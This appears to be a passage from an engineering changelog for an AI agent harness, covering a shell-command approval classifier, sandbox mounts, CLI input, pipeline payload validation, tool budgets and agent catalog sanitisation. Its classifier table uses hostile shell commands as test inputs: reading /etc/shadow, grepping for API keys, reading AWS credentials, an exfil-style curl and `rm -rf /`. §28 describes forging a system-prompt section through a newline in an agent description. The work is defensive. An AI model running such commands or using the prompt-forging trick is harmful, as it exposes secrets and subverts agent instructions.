not advertising remember, spawn_subagent, write_project_doc                    <- granted run
not advertising mcp__demo__post, remember, spawn_subagent, write_project_doc   <- no flags
```

**Two container-only failures, both in the harness rather than the code, and both worth
recording** because each is a way a verification run lies:

- The wire measurement first died on `no such table: conversationthread`. A research pass
  persists a thread, and a fresh container has no `app.db` — it had only ever worked on
  Windows because a long-lived local database already had the table. That is verbatim the
  gotcha ARCHITECTURE §11 records about `pipelinerunrecord`, met from the other side.
- The `#159` config mutation reported a **false GREEN**: the needle was LF and `config.py` is
  CRLF, so it never applied and the tests passed for the ordinary reason. Caught only because
  the harness asserts the byte count changed after writing. **A mutation that fails to apply
  is indistinguishable from a surviving mutant unless the application itself is checked** —
  which is why every mutation in this project is EOL-normalised, byte-diffed, and
  `py_compile`d before pytest is allowed to run.

### The mutation harness produced a FALSE RED, mirroring the false GREEN above

`R13-enforcement-truthiness-instead-of-is-None` (`answered_by_name = signoff is None` ->
`not signoff`) was reported RED and **actually survives the whole suite.** The harness passed
a two-file test spec as a *single* argument, so pytest got `"tests/test_agents.py
tests/test_grants.py"` as one path, errored, and the non-zero exit read as a kill.

So both directions are now on record, from the same batch:

| | cause | what it looks like |
|---|---|---|
| **false GREEN** | the needle never applied (LF vs CRLF) | a surviving mutant, i.e. a missing test |
| **false RED** | pytest failed for a reason unrelated to the mutation | a covered guard, i.e. a test that does not exist |

The false RED is the more dangerous of the two: a false GREEN sends you looking for a test you
then write, while a false RED tells you to stop. **A mutation pass has to check that the
failure it saw is the failure it expected**, not merely that the exit code was non-zero — the
harness now splits the spec, drops `-x` so the killing test is visible in the tail, and every
mutation carries the name of the test that should kill it so the two can be compared by eye.

The surviving mutant was real and is now covered. `test_s1_signoff_is_remembered_per_agent_
not_per_tool_name` answers the sign-off with a **non-empty** set, which is truthy either way,
so it could never discriminate. `test_an_EMPTY_signoff_is_remembered_too` answers with
`set()` — spawn the agent, grant it nothing — which is a real answer and is falsy.

### Note on §21's row for the headless denial string

Any earlier row asserting the exact text `"requires approval and was not given"` still holds
**only where a channel exists**. Headless, that string now differs by whether the tool was
gated by name or by its arguments. The change is deliberate and the old wording was the
defect: it told the model to retry with approval in the one situation where approval cannot
be obtained.


---

## §24 — the eighth fix batch: the shell capability classifier (2026-08-18)

Closes audit **#157** (S1) and **#50** (S3). ROADMAP_v2 **§28**, decisions **G1–G7**.

### The config change that breaks things, stated first

**`ToolApprovals.shell` ships `False` instead of `True`, and `config.SHELL_APPROVAL_MODE` ships
`"tiered"`.** These move together or neither means anything — see below. If you have a fork, a
patch, or a test that reads `ToolApprovals().shell` expecting `True`, it is now wrong.

`False` here does **not** mean "never ask". The gate is `SHELL_APPROVAL_MODE`. The field is the
ratchet: setting it `True` still forces `always`, because `approval_needed` ORs the tool's own
check with `requires_approval` and both read it. D14's one-way property is intact — a config or
an agent override can still only tighten.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| `ToolApprovals().shell` | `True` | `False` | While it was `True` the tool's check could never lower the answer, so `tiered` was unreachable dead code (G3) |
| `config.SHELL_APPROVAL_MODE` | did not exist | `"tiered"` | The gate. `always` / `tiered` / `never`; an unknown value **raises at import** |
| `_shell_approval_check(name, params)` | five-step ladder, four steps dead | classify → decide | Same signature, same registration; the body is replaced |
| `run_sandboxed(...)` | `(command, workspace_dir, shell_binary, docker_available)` | `+ profile=` | Optional. `None` classifies internally, so existing callers are unaffected |
| `run_sandboxed(...)` | never touched the filesystem | `os.makedirs(workspace_dir, exist_ok=True)` | #50. **A test passing a fictional `workspace_dir` now creates it** — the suite's own routing tests passed `"/tmp/ws"` and left a real `C:\tmp\ws` behind until they moved to `tmp_path` |
| `_run_inert` / `_run_subprocess_fallback` | caught `FileNotFoundError` | catch `OSError` too | #50's other half: a bad CWD is `NotADirectoryError` on Windows, which is **not** a `FileNotFoundError`, so it escaped the handler entirely |
| `_run_docker` argv | one `-v` | sometimes two | A `:ro` bind for `.venastine`, only when it is nested in the workspace **and** already exists (G6) |
| `settings.json` | `shell_approval_mode` → "unknown key" | rejected **by name** | G7, R12's rule on a third key |
| `shell` `ToolSpec` | no `approval_notice` | `_shell_approval_notice` | The prompt now says *where* the command runs |
| `classify_command(command, ws)` | — | total over any input | The gate is handed the model's raw tool input; `ShellParams` does not validate until `run()` |

### Before and after, measured

The defect first, because it is larger than #157 states. With `ToolApprovals.shell = False` and
both fallback flags at their shipped values:

```
docker=True   -> set of answers from _shell_approval_check, every command shape: {False}
docker=False  -> set of answers from _shell_approval_check, every command shape: {False}
```

No command reached a `True`. Step 4 was the only rung that could produce one, and it needs
`ALLOW_INSECURE_SANDBOX_FALLBACK=True`, which does not ship. The five-layer policy was a
pass-through for one boolean.

Then the same commands through the real gate, measured on Linux in `python:3.11-slim`:

```
command                     BEFORE (asked?)      AFTER (tier / containment / asked?)
cat /etc/shadow             False, on the HOST   HOST_READ      uncontained  True
grep -r sk-ant /            False, on the HOST   HOST_READ      uncontained  True
cat ~/.aws/credentials      False                SANDBOXED      contained    False
curl https://a/?d=x         False, with egress   SANDBOXED_NET  contained    True
pip install evil            False, with egress   SANDBOXED_NET  contained    True
ls -la                      False                INERT          uncontained  False
cat notes.txt               False                INERT          uncontained  False
python x.py                 False                SANDBOXED      contained    False
```

`cat ~/.aws/credentials` reads oddly and is correct: `~` is a metacharacter, so the command was
never inert, and in a container `~` is the container's home.

### Exactly one thing got looser

Read-only commands whose every argument resolves inside the workspace are auto-approved, where a
pre-§28 user with `ToolApprovals.shell = True` was prompted. `ToolApprovals.read` is already
`False`, so `read` on a workspace file was unprompted while `cat` on the same file prompted —
that inconsistency is what went away. Everything else is unchanged or strictly tighter.

`SHELL_APPROVAL_MODE = "never"` **is** the old loose configuration, kept on purpose. The fix is
not that it became unreachable; it is that reaching it means writing the word `"never"` rather
than switching off a field that reads like "stop nagging me".

### Vacuity classes

Nothing new this batch, but two known ones bit and are worth the record.

**A check that passes because its input was empty.** `CommandProfile` originally had no
`measured` field. A profile the classifier could not characterise answers `False` to every
capability question, so the CONTAINED branch approved it *for having no network* — an
unmeasurable command auto-approved by the containment argument. The field exists to make
"we could not tell" unarguable, and it is where batch 9's "the model is not sure" has to land.

**A test whose premise is the thing under change.**
`test_ac3_context_false_does_not_suppress_tool_approval_check` pinned D14's ratchet using
`rm -rf /` and a docstring that said it worked *because* `ToolApprovals.shell` defaulted `True`
and step 1 returned before anything read the command. Flipping that field made `rm -rf /`
genuinely contained, so the test would have been asserting the override rather than the tool.
It now uses `cat /etc/shadow`, whose answer comes from the tool under every configuration and
without probing Docker.

### Mutation pass

Fourteen mutations, thirteen red on a test named for each, one green control, `git status
--short` clean after restore. Two came back other than predicted:

| mutation | predicted | actual | what it taught |
|---|---|---|---|
| `.venastine` **nested** half deleted | GREEN — `os.path.join` always produces a nested path, so the guard looked unreachable | GREEN on Windows, **RED on Linux** | The reasoning was wrong: `realpath` resolves **symlinks**, so a `.venastine` symlinked at `/etc` escapes. Now killed by a test needing directory symlinks — which skips on Windows, so this guard is verified **only** in the container (§21's rule) |
| `SHELL_APPROVAL_MODE` flipped to `"never"` | GREEN — nothing pins the shipped value | **RED** | It was pinned by accident, by a §7 fallback test that happens not to set the mode. Coverage by accident moves the moment that test sets it, so it now has a test that states it |

### Verified outside the suite

The `.venastine` mount's semantics are **measured in a real container**, not asserted from
memory: `/workspace` writable, the subtree `EROFS`, `rm` and `mv` on the mountpoint refused with
`EROFS` and `EBUSY`, reads unaffected, host copy byte-identical, and the container's write to
`/workspace` visible on the host so builds still work.

And the hazard the `isdir` half exists for is real: `docker run` with a missing bind source
**creates it on the host**, and an empty `.venastine/` flips `is_trusted()` from `True` to
`False` on its own. An unconditional mount would have conjured a directory into the user's
project and then prompted them to trust it.

### Platform note

`test_a_windows_drive_and_a_unc_path_escape_on_windows` is skipped off Windows, and that is a
statement about paths rather than a gap. `os.path.join` on POSIX reads `C:/Users/x` as a
relative directory named `C:`, so it stays inside the workspace — and it should, because it
names nothing outside it there. The escape is real only where the syntax is. The Linux
container is what found the combined assertion wrong.

### Verification

| | |
|---|---|
| Windows | **1742 passed, 16 skipped, 1 deselected** |
| `python:3.11-slim` | **1757 passed, 1 skipped, 1 deselected** |
| the one Linux skip | `test_a_windows_drive_and_a_unc_path_escape_on_windows`, by design — see the platform note above |
| mutations | 14; 13 red on a test named for each, 1 green control, `git status --short` clean after restore |
| the Linux-only mutation | `.venastine` nested guard: GREEN on Windows (its test skips), **RED in the container** |
| outside the suite | `python main.py --help` exit 0 and `import tui.app` on both platforms; the `:ro` mount measured in a real container |

The two totals agree: 1742 + 16 = 1757 + 1 = 1758 collected.


---

## §25 — the ninth fix batch: the CLI shell (2026-08-19)

Closes audit **#100** (S1), **#7** (S2), **#101** (S3), **#102** (S3) and **#141** (S4).
ROADMAP_v2 **§29**, decisions **N1–N8**.

> This file's section counter runs independently of ROADMAP_v2's, so this `§25` is the ninth fix
> batch and the `§25` above is authorized tool use. §19–§23 already collide the same way. That is
> audit **#17**'s overloaded-namespace family and is left alone here rather than renumbered mid-batch.

### The change that breaks a test, stated first

**`builtins.input` is no longer a seam any test can use to drive the CLI.** `main.py` reads stdin
through exactly one object now — that is the fix for #100 — so patching `input` reaches nothing.
Six call sites across `test_e2e.py`, `test_memory_shells.py` and `test_shell_compaction.py` move to
`tests/conftest.py`'s new `cli_stdin` fixture:

```python
mocker.patch("builtins.input", side_effect=["hello", EOFError()])   # before
cli_stdin("hello")                                                  # after
```

`FakeStdinReader` records `prompts` and `timeouts`, so a test can assert on what the user was asked
and whether the question carried a deadline at all.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| `_StdinReader.ask(prompt, timeout)` | timeout required | `timeout=None` optional, meaning **wait forever** | N2. A caller relying on the positional gets no deadline instead of one |
| `_StdinReader` | one method | `+ readline(prompt)`, `_EOF`, `_eof`, `_start`, `_ended` | N1/N3 |
| `build_attended_provider(honour_run_scope)` | — | `+ timeout=` | N2. The default is a **sentinel**, resolved in the body, so `conftest`'s `shrink_approval_timeout` keeps working |
| `_prompt_review_decision(reader, finding, round)` | — | `+ timeout=` | Same, for the channel that calls it |
| the channel returned by `build_attended_provider` | — | `+ .rendered_kinds` | Read by the parity test; nothing in production branches on it |
| `main.py` | no `main()` | `main(argv=None) -> int` | N7. `if __name__` is now two lines |
| `main.py --no-review` in chat | accepted, ignored | **`parser.error`, exit 2** | N8. A script passing it unconditionally starts failing |
| `main.py --review` in chat | accepted, ignored | **`parser.error`, exit 2** | N8 |
| `--help`, a typo'd flag | created `app.db` + `logs/` | create nothing | N6 |
| `--memories` / `--summary` / `--init` | ran the legacy sweep | skip it | N6. None of them shows the thread picker the sweep exists for |
| CLI `--init` prompts | hand-written, `input()`, blocked forever | the response channel, still blocking | N5/N2. Wording changes slightly; the affordances do not |
| `settings.json`, config | unchanged | unchanged | nothing here reads either |

### Before and after, measured

```
#100, under a REAL pty -- the only place two blocked readers on one tty can be seen
  before  (input)      APPROVAL_GOT='y\n'   CHAT_GOT never printed, child still running
  after   (readline)   APPROVAL_GOT='y\n'   CHAT_GOT='the next question'
  Ctrl+D  (readline)   CHAT_EOF             (N3)

#7, does the CLI put the question to a human at all?
  approval yes | subagent_signoff yes | question yes | review yes
  confirm  NO -> yes        (silently decoded False before)
  choice   NO -> yes        (silently decoded None before)

#101, in a fresh empty directory
  before  --help     -> app.db (77824 bytes) + logs/    exit 0
  after   --help     -> nothing                          exit 0
          --notaflag -> nothing                          exit 2
```

### The one thing that did NOT change, and was checked rather than asserted

N2 moves the deadline from a constant read inside each handler to a property of the channel. It is
meant to change nothing for the four run-backed prompts, so the rendered prompt strings were captured
before and after and diffed. Identical, including `"  Allow? [y/N] (600s): "`. `QUESTION` rendered no
deadline before and still does not.

### Vacuity classes

**A test whose seam the fix removes.** Six tests drove `run_chat` by patching `builtins.input`. After
N1 they exercised a function nothing calls. They did not fail — they *hung*, because the reader was
waiting on a queue nobody was filling, which is a worse failure than a red test and the reason the
mutation harness now reports HANG as its own outcome.

**A guard whose test targets the wrong line.** The first `N5-init-handed-a-channel-on-a-pipe`
mutation deleted `channel = build_attended_provider(...) if interactive else None` and came back
GREEN. Correctly: building a channel on a pipe is harmless, because what decides whether `generate`
gets a consent route is `confirm=_confirm if interactive else None` at the **call**. A surviving
mutant with a confident explanation is the one to distrust — §28's lesson, arriving again, and this
time the explanation was mine.

**A fixture that keeps passing and stops working.** `shrink_approval_timeout` documents "read at call
time, so patching the module attribute is enough". A `timeout=config.ATTENDED_APPROVAL_TIMEOUT_S`
default argument is evaluated at import and silently takes that away. Nothing goes red; the fixture
simply stops shrinking anything, and the next unanswered prompt stalls the suite for ten minutes
instead of failing it.

### Mutation pass

24 mutations, one green control, `git status --short` clean after restore. Two came back other than
predicted and both mattered:

| mutation | predicted | actual | what it taught |
|---|---|---|---|
| `--init` handed a channel on a pipe | RED | **GREEN** | It targeted the channel construction; the load-bearing guard is at the `generate()` call. Retargeted, then RED |
| the pump's EOF publication | RED | **HANG** | A mutation that strands a reader does not fail the suite, it stops it. HANG is now a reported outcome, and counts as a kill only where RED was expected |

### Platform note

Windows has no `pty` module, so #100's probe — the only thing that can see two blocked readers on one
terminal — runs **only** in the container. §21's rule applies exactly: this defect is not verified
until the probe runs where a pty exists. What Windows *can* answer is whether N1 costs anything: a
reader parked with no deadline is not woken by `_thread.interrupt_main()`, and neither is `input()`,
and neither is `ask`'s timed wait; under a real console control event all three exit identically with
`STATUS_CONTROL_C_EXIT`.


---

## §26 — the tenth fix batch: the pipeline's payload boundary (2026-08-20)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23 and §25 already collide the same way — so this §26 is the tenth fix batch,
> and the earlier §26 is §26 of ROADMAP_v2's numbering. Audit **#17** owns the overloaded-namespace
> family; extending the collision silently is what that issue is about.

Closes audit **#76** (S1), **#75** (S2), **#78** (S3), **#79** (S3) and **#123** (S3).
ROADMAP_v2 **§30**, decisions **B1–B11**.

### The change that breaks a test, stated first

**A pass's SHAPE is now part of its contract, not just its parseability.** A test double that queues
`{"ok": true}` for a pass whose prompt promises an array now spends every corrective retry and then
fails the run. Seven such doubles existed, in four files, and they were possible only because nothing
checked:

```python
make_model_response(text='{"ok": true}')        # before
make_model_response(text=well_shaped("Pass 2")) # after
```

`tests/conftest.py` grows `well_shaped(pass_id)` — the smallest payload each pass accepts — in ONE
place, so the next spec change moves one line rather than nine.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| a pass payload that parses but is the wrong shape | applied, or silently discarded | a corrective retry, then `PayloadShapeError` → `status='failed'` | B2. A run that used to complete with wrong data now fails with a message naming the pass and the field |
| a pass payload naming ids that match **nothing** | silently skipped, trace reported success | the same failure | B5 |
| a pass payload naming ids that match **some** | unchanged | unchanged — applied, and the trace reports how many | B5's control. Deliberate: one stray id must not kill a nine-pass run |
| two claims sharing an `id` | accepted, and split across the two lookups | rejected at Pass 2 | B6 |
| `retry_until_json(...)` | — | `+ validate=` (defaults to `None`, so §20's reviewer is unchanged) | B2 |
| `_run_pass_with_json_retry(...)` | — | `+ claim_ids=`, `+ ensemble=`; still returns `str` | B3 |
| `_apply_grounding` / `_apply_critic` / `_apply_assumption_flags` | `-> None` | `-> int`, the number of claims touched | B5 |
| `PipelineRun.claim_by_id` | its own `next(...)` | `base.resolve_by_id(...)`, first wins | B6 |
| **`score_breakdown`'s keys**, in `04_confidence.json` and `/claims` | `grounding_component` on every claim; `disagreement_penalty` on every claim of an ensemble run | `+ formula`; `grounding_component` **only** on the factual branch; `+ capped_critic_component` on the non-factual one; `disagreement_penalty` is what was applied; `+ consistency_reported` when a clamp fired; `+ unrecognised_grounding_status` / `unrecognised_type` when one was coerced | B10. A reader can now reconstruct `raw_score` from the stored fields; before, a non-factual claim's fields gave 0.25 against a stored 0.65 |
| `consistency_score` on an ensemble run | always a number | **`None` when Pass 2 reported nothing** | B7. Absent and zero were indistinguishable, and only one is a statement about the claim |
| three checkpoint trace lines | reported the count the pass was ASKED about | report the count APPLIED | B5. Anything matching on the old wording moves |
| `prompts/claim_extraction.md` | asks for `asserted_by_candidates` only on multi-candidate claims | asks for it on every claim in ensemble mode | B7 |
| an unrecognised `grounding_status` reaching Pass 4 | weight 0.0, and it ESCAPED the forced-UNVERIFIED rule | scored as `ungrounded`, traced | B9 |
| an unrecognised `type` reaching Pass 4 | the non-factual branch, capped at 0.65 | the factual formula, traced | B9 |
| `settings.json`, config, the database schema | unchanged | unchanged | nothing here reads or writes either |

### Before and after, measured

```
#76, driven end to end with the model refusing to correct
  Pass 2 wraps its list   AttributeError: 'str' object has no attribute 'items'
                     ->   Pass 2: expected a JSON array, got object. Return the array
                          itself, not an object wrapping it.

  Pass 3b severity="0.0"  TypeError: unsupported operand type(s) for -: 'float' and 'str'
                          (raised in PASS 4, two passes downstream)
                     ->   Pass 3b: entry 0 has severity='0.0', which is string; expected number.

  the two SILENT ones, which completed a run and reported success:
  Pass 5 flags at top      "Pass 5: assumption audit complete, 0 claim(s) flagged."
                     ->   Pass 5: the response is missing required key(s) 'per_claim_flags'.
  3a/3b unknown ids        "Pass 3a: grounded 4 unique entities across 3 factual claim(s)."
                     ->   Pass 3a: not one of the 3 claim_id value(s) matches a claim you
                          were given (got '1', '2', '3'; expected ids like 'C1', 'C2', 'C3').

#75.1, grounded factual, severity 0.2143, three-model roster
  [1, 2, 3, 3] one repeat    HIGH 0.825 penalty -0.05  ->  MEDIUM 0.775 penalty 0.0
  [1, 2, 3, 4] out of range  HIGH 0.825 penalty -0.05  ->  MEDIUM 0.775 penalty 0.0, reported 1.3333

#75.1b, the same claim with the field ABSENT
  MEDIUM 0.70 penalty 0.15   ->  HIGH 0.85 penalty 0.0, consistency None

#75.2
  'Ungrounded' -> LOW    ->  UNVERIFIED        'Factual' -> MEDIUM  ->  UNVERIFIED
```

### The one thing that did NOT change, and was checked rather than asserted

A well-formed run's full trace and every claim's breakdown were captured before and after and
diffed. The only differences are the three B5 lines and B10's keys — no tier moved, no `raw_score`
moved, and §10's byte-for-byte non-ensemble guard still holds: with `ensemble_n == 0` no consistency
field is recorded at all, exactly as before.

### Vacuity classes

**A test double the fix invalidates.** Seven queued payloads no pass would ever emit. They did not
fail — they *retried*, three times, and then failed the run with a message about a shape the test
never meant to be about. The fix makes the doubles more honest than they were.

**Two guards overlapping on one input.** `B8-dedupe-removed` survived because the clamp pulls
`[1, 2, 3, 3]`'s 4/3 back to exactly the deduped answer. The test could not tell which guard was
working. The discriminating input — a repeat that stays *below* the denominator — is the one that
states the defect without the other guard's help.

**A rule asserted in a comment.** `payload_validation.py` copies `review.py`'s "type guards BEFORE
the membership tests" by name and explains why. Deleting the guard left the suite green: the only
unhashable-value test aimed at a field checked by a different branch.

### Mutation pass

34 mutations, one green control, `git status --short` clean after restore, and the whole table re-run
inside `python:3.11-slim` where six of the Windows skips are live — **34/34 on both**. The two
survivors above were fixed in the tests, not the code, and the control came back RED once for a
reason that was not the mutation: the documented test count had drifted behind two newly added
tests. That is exactly the false-RED the control exists to separate.

### Platform note

Nothing in §30 is platform-specific — the boundary is pure Python over already-parsed JSON — and
that is worth confirming rather than assuming, which is what the container mutation run does. Every
number matches Windows to the digit.


---

## §27 — the eleventh fix batch: what a tool call is allowed to cost (2026-08-20)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23, §25 and §26 already collide the same way — so this §27 is the eleventh fix
> batch. Audit **#17** owns the overloaded-namespace family; extending the collision silently is what
> that issue is about.

Closes audit **#57** (S1 — the last one), **#55** (S3) and **#56** (S3).
ROADMAP_v2 **§31**, decisions **H1–H10**.

### The change that breaks a registration, stated first

**`ToolSpec` has a new REQUIRED field.** `budget` must be one of `BUDGET_COMPUTE`, `BUDGET_IO` or
`BUDGET_HUMAN`, and `assert_budget_declared()` runs at `tools/registry.py` import. Any out-of-tree
registration — a fork's extra tool, a branch mid-rebase — now fails at import with the tool named,
not at its first call.

That is deliberate and it is R13's trade, unchanged: `None` means undeclared rather than defaulting,
because an unwrapped tool looks, from every layer above it, exactly like a tool that is bounded
somewhere else. A default would have recreated #57 silently for the next tool added.

`mcp__*` names are exempt — they are named at connection time and cannot carry a static declaration —
and `mcp_client/registration.py` passes `BUDGET_IO` explicitly anyway, so the exemption is
documentation rather than the live path.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Drop `budget=` from any registration | `assert_budget_declared` raises at import; `test_every_statically_registered_tool_declares_a_budget` names the tool | R13's rule. Omission has to be a detectable mistake, not an inherited answer |
| Give `ToolSpec.budget` a default value | The same tests pass while the mechanism silently stops covering new tools | This is the exact failure the field exists to prevent; the value of `None` is that it is not an answer |
| Misspell a budget (`"computee"`) | `test_a_misspelled_budget_is_fatal_rather_than_ignored` | A typo drops the tool out of the mechanism *while looking answered*, which is worse than an omission |
| Declare a `BUDGET_COMPUTE` tool that also injects | `test_a_compute_tool_that_declares_an_injection_is_fatal` | Not a style rule: compute routes through a process boundary and nothing in `_INJECTABLE_PARAMS` survives one. Caught at import instead of at the first call |
| Route `BUDGET_HUMAN` through the compute clock | `test_ask_user_is_not_bounded_by_the_compute_budget` | `ask_user` blocks on a person for up to `ATTENDED_APPROVAL_TIMEOUT_S` (600s). A 15s clock would answer the question on the user's behalf |
| Replace the subprocess with a thread watchdog | `test_a_timed_out_call_is_STOPPED_not_merely_abandoned` | Every other test in that class would still pass. sympy has no interruption point, so a thread keeps a core busy while the harness reports a timeout that did not happen |
| Measure that property with `os.times()` | Nothing fails — and that is the point | `children_user`/`children_system` are always **0.0 on Windows**, so the assertion would be trivially true on the platform it usually runs on. It measures bytes the child wrote to disk instead |
| Isolate inside the six math tools rather than at `dispatch` | 131 tests in `test_math_tools.py` start measuring the transport | They call `module.run(params)` directly and never `dispatch`. Keeping the seam at the one production handler call site is what keeps them about the maths |
| Delete `_interpret`'s negative-returncode branch | `test_a_child_killed_by_its_own_cpu_limit_reports_the_limit` | On Unix RLIMIT_CPU kills the CHILD, so `subprocess.run` returns rather than raising `TimeoutExpired`. Without this branch Linux reports `did not return a usable result (exit -9)` where Windows names the limit — the better-protected platform giving the worse answer |
| Widen it to `returncode != 0` | `test_a_crashed_child_is_NOT_reported_as_a_limit` | A child that exits non-zero without a signal has a bug, not a budget problem. Telling a model to try smaller numbers sends it round a loop that cannot end |
| Give the two bounds separate wordings | `test_both_bounds_give_the_SAME_sentence` | They are the same event to the only reader that matters. Two copies is how they drifted in the first place |
| Reuse `sandbox._unix_resource_limits` for the child | Nothing fails, and the inner layer stops existing | It spends `SANDBOX_CPU_SECONDS` (30), which is *above* the 15s budget — a limit that can never fire, reading to anyone checking as though H3 were present |
| Restore `pow(base, exponent, modulus)` with an optional modulus | `TestModularExponentIsModular` | `pow(b, e, None)` is plain exponentiation: 0.000s with a modulus, 3.3s and 125 MB without, on the same exponent |
| Move `str(result)` back outside `discrete_math.run`'s try | `TestAResultTooLargeToPrintIsTheToolsOwnError` | An ordinary input produced a bare `ValueError`, dispatch's generic wrapper, and a `logger.exception` traceback as though it were a bug |
| Stringify the dict branch's VALUES while fixing that | `test_a_dict_result_still_carries_its_values_untouched` | The first draft did. It rewrote every `prime_factors` exponent, and the corpus diff caught it |
| Drop `edit_run`'s size guard | `TestEditRejectsAnOversizedFileBeforeOpeningIt` | 60 MB of peak traced memory on a 30 MB file, to answer "old_text not found in file" |
| Give `read_project_doc` a `getsize` guard instead of the seek | `test_a_LATER_page_does_not_re_read_the_prefix_into_memory` | A size check would refuse the large document `/init` is meant to page through, and would leave the per-page re-read in place |
| Replace `fetch_url`'s cap with a `Content-Length` check | `test_a_lying_content_length_changes_nothing` | A hostile server can omit the header or lie about it. Only refusing to keep reading is a bound |
| Have the fake's `iter_bytes` yield one chunk | `test_the_read_stops_at_the_byte_cap` stops discriminating | One giant chunk satisfies any cap on the first iteration, so the double would decide the outcome instead of the code |
| Point the two real-httpx tests back at `httpx.get` | They reach for a real socket and error in `socket.py` | §31 moved the tool to `httpx.stream`. Those two drive REAL httpx through a MockTransport precisely so they can prove a blocked hop was never requested, so they must stub the entry point the tool calls |
| Check for committed checkpoints with a filesystem walk | It fails on any machine with notebook history | This working tree has eight `.ipynb_checkpoints` directories and exactly one was ever committed. A test people learn to ignore protects nothing — it asks git what is tracked |
| Check for them via `.gitignore` instead | It reports clean while the files sit there | `.gitignore` already listed `.ipynb_checkpoints/`, and gitignore does not untrack. That is how both files survived |

### Behaviour changes a caller can observe

| before | after |
|---|---|
| A compute tool ran in-process under `dispatch` | It runs in a child. `module.run(params)` is unchanged, but **patching a math tool's internals no longer affects a *dispatched* call** — the child imports a fresh module |
| `modular_exponent` with no modulus computed a plain power | An error naming the field, in 0.36s instead of 3.3s |
| `factorial n=100000` returned `"discrete_math failed: Exceeds the limit (4300 digits)…"` plus a logged traceback | The tool's own error, saying to try smaller inputs, with no traceback |
| `read_project_doc`'s message said `Read characters 0-20000 of 30000993` | `Read characters 0-20000.` The total **was** the whole-file read being removed, and `os.path.getsize` would substitute bytes for characters — a number that looks exact and is not |
| `edit` on a file over `MAX_FILE_SIZE_BYTES` reported `old_text not found` | It reports the size refusal, in read's wording |
| `fetch_url` buffered the whole body, then sliced | It streams and stops at `MAX_CONTENT_BYTES`; `truncated` is now True when *either* bound bit. A redirect costs no body at all |
| The offline `httpx` fake had `get` only | It also has `stream`, and `_Response.iter_bytes` |

### Vacuity classes

**A test whose input is already zero on the platform it runs on.** The first version of
`test_the_cpu_is_reclaimed` used `os.times()`, whose child-CPU fields are hard-wired to 0.0 on
Windows. It passed. It would have passed with the subprocess replaced by a thread, with the timeout
deleted, with the whole mechanism removed — the assertion was `0.0 < 0.5`. Caught by asking what the
measurement would read if the code were wrong, rather than by watching it go green.

**A test asserting an absence that a never-started process also produces.** Its replacement asserts a
file *stopped* growing, which is equally true if the child never ran. `test_the_probe_would_notice_a
_child_that_kept_going` is the positive control: same handler, observed while still running.

**A double that cannot express the thing under test.** The offline httpx fake had no `stream`, so
`fetch_url`'s new bound was unreachable through it. Adding one chunk-at-a-time `iter_bytes` is what
makes the cap testable at all — batch 10's lesson (turning on a check makes the doubles part of the
contract) with a different tool.

### Platform note

H3's second layer is POSIX-only and its two tests skip on Windows. That makes the container run
load-bearing rather than confirmatory: a guard whose test can skip is not verified until the mutation
runs where the test does (§21's rule).


## §28 — the twelfth fix batch: the catalogs (2026-08-21)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23 and §25–§27 already collide the same way — so this §28 is the twelfth fix
> batch, recorded in ROADMAP_v2 **§32**. Audit **#17** owns the overloaded-namespace family.

Closes audit **#68** (S2), **#131** (S2, security), **#69** (S3), **#70** (S3), **#71** (S3) and
**#72** (S3). ROADMAP_v2 **§32**, decisions **A1–A11**.

### The two changes that break a file outside this repository, stated first

**1. A harness-tier agent must declare `spawnable`.** `config_loader.assert_spawnable_declared()`
runs inside `initialize()` and raises `RuntimeError` naming every offender. A fork's extra
`agents/builtin/*.md` now fails at startup rather than being silently advertised as a delegation
target that cannot be fed.

The asymmetry is the decision: **user- and project-tier agents that omit it load as
not-spawnable and do not raise.** R13's "omission must be a detectable mistake" is a rule about
fields on things this project declares. Applied to a file someone else wrote it gives the wrong
answer — raising there would take down startup over a stranger's frontmatter, which is the trade
`_parse_md_file` refuses everywhere else in that module.

**2. `name` and `description` are rewritten at parse time.** `_catalog_text()` collapses all
whitespace to single spaces and truncates at `config.MAX_CATALOG_TEXT_CHARS` (300). A multi-line
description is no longer multi-line, anywhere. Every shipped file already complies —
`test_no_shipped_description_is_altered_by_the_bound` asserts it — so nothing in this repository
changes shape, but a project relying on a formatted description will see it flattened.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Point `with_catalogs` back at `registry.is_allowed` | `test_a_gated_load_skill_suppresses_the_SKILL_catalog_too` for the skill half; `test_no_pass_prompt_invites_a_tool_the_pass_cannot_call` for the agent half | `is_allowed` is POLICY — "is this tool permitted", not "can this run call it". The skill half is the narrow one: the two agree everywhere the shipped install reaches, and differ only for an agent declaring `approval_overrides: {load_skill: true}` on a headless run |
| Give `is_advertised` a filter of its own instead of the one `schemas()` uses | `test_is_advertised_agrees_with_schemas_for_every_tool`, parametrised over both modes and every registered tool | A wrapper that merely LOOKED like the filter would pass a test naming one tool. Agreement is the property A1 buys, so it is asserted over the whole registry |
| Write `headless_hidden()` as a hand-copied negation again | `test_headless_hidden_is_exactly_the_difference` | #67/#133 are what a shared mechanism with a duplicated policy costs. It is now literally "advertised attended, not advertised headless" |
| Default `with_catalogs(callable_only=...)` to `True` | `test_an_attended_pass_still_gets_the_catalog` | §25's point: a pass WITH a channel can ask, so hiding its catalog reports a limitation the run does not have |
| Stop passing the facts at `run_deep_research_mode` | `test_an_unattended_pass_is_not_told_to_spawn` | Everything else drives `pass_prompt` directly, which pins the FUNCTION and not the call. This mutation survived the whole suite once — the fix correct and unreached, which is #68's own shape |
| Make `advertisement_facts(None)` return "attended" | `test_no_bundle_means_headless` | `_authorization_kwargs` returns `{}` for `None`, so `response_channel` stays `None` and `_run` reads that as headless. Any other answer advertises a catalog to exactly the runs that cannot use it |
| Drop the whitespace collapse from `_catalog_text` | `test_the_forged_section_cannot_reach_a_system_prompt` | This is the security half, not a tidiness. The catalogs render `- {name}: {description}`, so a newline does not look untidy — it LEAVES ITS BULLET and forges a top-level prompt section |
| Apply the bound to `description` but not `name` | `test_the_name_is_normalised_too` | Both are interpolated into the same line. The name is the half a reader is less likely to think of |
